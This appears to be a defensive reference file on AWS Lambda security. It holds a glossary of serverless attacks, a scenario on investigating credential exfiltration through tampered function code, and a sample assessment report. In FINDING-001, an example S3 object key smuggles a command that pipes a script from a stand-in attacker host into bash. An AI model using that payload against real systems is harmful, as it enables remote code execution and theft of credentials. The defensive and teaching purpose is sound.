---
name: cloud-serverless-general
description: "Cloud Serverless General."
domain: cybersecurity
---

|
| **Event Source Poisoning** | An attack where malicious data is injected into a serverless event source (S3, SQS, DynamoDB Stream, API Gateway) to trigger code execution or injection when the function processes the event |
| **Function Injection** | Exploitation of unsanitized event data that flows into dangerous runtime functions (eval, exec, os.system, child_process.exec) within a serverless function handler |
| **Lambda Layer Hijacking** | An attack where a malicious Lambda layer is attached to a function to intercept execution, override dependencies, or exfiltrate data by placing code in the runtime's module search path |
| **IAM Privilege Escalation via Lambda** | A technique where an attacker with UpdateFunctionCode and PassRole permissions modifies a function to execute with a higher-privilege IAM role, extracting temporary credentials |
| **OWASP Serverless Top 10** | A security framework identifying the ten most critical risks in serverless architectures, including injection (SAS-1), broken authentication (SAS-2), and over-privileged functions (SAS-6) |
| **Cold Start Injection** | An attack that targets the function initialization phase where environment variables, layer code, and extensions execute before the handler, potentially in an unmonitored context |
| **Execution Role** | The IAM role assumed by a Lambda function during execution, providing temporary credentials that define the function's AWS API access permissions |

## Tools & Systems

- **Semgrep**: Static analysis tool with serverless-specific rule packs that detect event data flowing into injection sinks across Python, Node.js, Java, and Go Lambda runtimes
- **Bandit**: Python-specific SAST tool that identifies security issues including use of eval, exec, subprocess with shell=True, and pickle deserialization
- **AWS CloudTrail**: Logs Lambda management events (UpdateFunctionCode, CreateFunction) and data events (Invoke) for detecting unauthorized modifications and anomalous invocation patterns
- **CloudWatch Logs Insights**: Query engine for searching Lambda execution logs for injection attempt indicators, runtime errors, and suspicious command patterns
- **AWS Config**: Evaluates Lambda function configurations against compliance rules including layer inventory, execution role permissions, and function URL authorization types
- **Prowler**: Open-source AWS security assessment tool with Lambda-specific checks for public access, overprivileged roles, and missing encryption

## Common Scenarios

### Scenario: Detecting and Responding to a Lambda-Based Privilege Escalation Attack

**Context**: A SOC analyst receives a GuardDuty alert for `UnauthorizedAccess:IAMUser/InstanceCredentialExfiltration.OutsideAWS` on an IAM role used by multiple Lambda functions. Investigation reveals that an attacker compromised a developer's AWS credentials with `lambda:UpdateFunctionCode` permissions and modified a payment processing function to exfiltrate the execution role's temporary credentials.

**Approach**:
1. Query CloudTrail for `UpdateFunctionCode` events in the past 7 days to identify when the function was modified and by which principal:
   ```
   fields eventTime, userIdentity.arn, requestParameters.functionName, sourceIPAddress
   | filter eventName = "UpdateFunctionCode20150331v2"
   | filter requestParameters.functionName = "payment-processor"
   | sort eventTime desc
   ```
2. Discover that the function was modified from an IP address in an unexpected geographic location at 02:47 UTC, outside of normal deployment windows
3. Download the modified function code and find an injected snippet that POSTs `os.environ['AWS_ACCESS_KEY_ID']`, `AWS_SECRET_ACCESS_KEY`, and `AWS_SESSION_TOKEN` to an external endpoint on each invocation
4. Check if the attacker also added a malicious layer by querying for `UpdateFunctionConfiguration` events with layer changes
5. Verify the function's execution role permissions: the payment-processor role has `dynamodb:*`, `s3:GetObject`, `s3:PutObject`, and `sqs:SendMessage` across all resources, exceeding least privilege
6. Search CloudTrail for API calls made by the exfiltrated credentials from outside AWS, finding `sts:GetCallerIdentity`, `s3:ListBuckets`, `dynamodb:Scan` on the customer table, and `iam:CreateUser` attempts
7. Respond by reverting the function code from the last known-good deployment package in the CI/CD artifact store, rotating the execution role's session tokens, and adding an SCP that restricts `lambda:UpdateFunctionCode` to the CI/CD role only

**Pitfalls**:
- Only checking the function code and missing malicious layers that persist even after the function code is reverted
- Not searching for lateral movement from the exfiltrated credentials to other AWS services, missing data exfiltration from DynamoDB or S3
- Failing to check if the attacker created new IAM users, access keys, or roles during the window the credentials were valid
- Restoring the function without first preserving the malicious code as forensic evidence
- Not implementing preventive controls (SCP, EventBridge alerting) after remediation, leaving the same attack path open

## Output Format

```
## Serverless Function Injection Assessment

**Account**: 111122223333
**Region**: us-east-1
**Functions Analyzed**: 47
**Event Source Mappings**: 23
**Assessment Date**: 2026-03-19

### Critical Findings

#### FINDING-001: OS Command Injection in S3 Event Handler
**Function**: image-resize-processor
**Runtime**: python3.12
**Severity**: Critical (CVSS 9.8)
**Sink**: os.system() at handler.py:34
**Source**: event['Records'][0]['s3']['object']['key']
**Attack Vector**: Upload S3 object with key containing shell metacharacters
**Proof of Concept**:
  Object key: `; curl http://attacker.com/shell.sh | bash`
  Results in: os.system("convert /tmp/; curl http://attacker.com/shell.sh | bash")
**Remediation**: Replace os.system() with subprocess.run() with shell=False
  and validate the S3 key against an allowlist pattern.

#### FINDING-002: IAM Privilege Escalation Path
**Function**: data-export-worker
**Execution Role**: arn:aws:iam::111122223333:role/DataExportRole
**Role Permissions**: s3:*, dynamodb:*, iam:PassRole, lambda:*
**Risk**: Any user with lambda:UpdateFunctionCode can modify this function
  to execute arbitrary AWS API calls with AdministratorAccess-equivalent permissions.
**Remediation**: Apply least privilege to the execution role, restrict
  lambda:UpdateFunctionCode via SCP to CI/CD pipeline role only.

#### FINDING-003: Unauthorized Layer Attached
**Function**: auth-token-validator
**Layer**: arn:aws:lambda:us-east-1:999888777666:layer:utility-lib:3
**Layer Account**: External account (999888777666)
**Risk**: Layer from untrusted external account can intercept all function
  invocations, modify responses, or exfiltrate environment variables.
**Remediation**: Remove the external layer, vendor the dependency into the
  function's deployment package, add AWS Config rule to block external layers.

### Detection Rules Deployed
- EventBridge rule: Alert on UpdateFunctionCode from non-CI/CD principals
- CloudWatch alarm: Function error rate spike > 3x baseline in 5 minutes
- Config rule: Lambda functions must not have layers from external accounts
- Config rule: Lambda execution roles must not have wildcard resource permissions
```
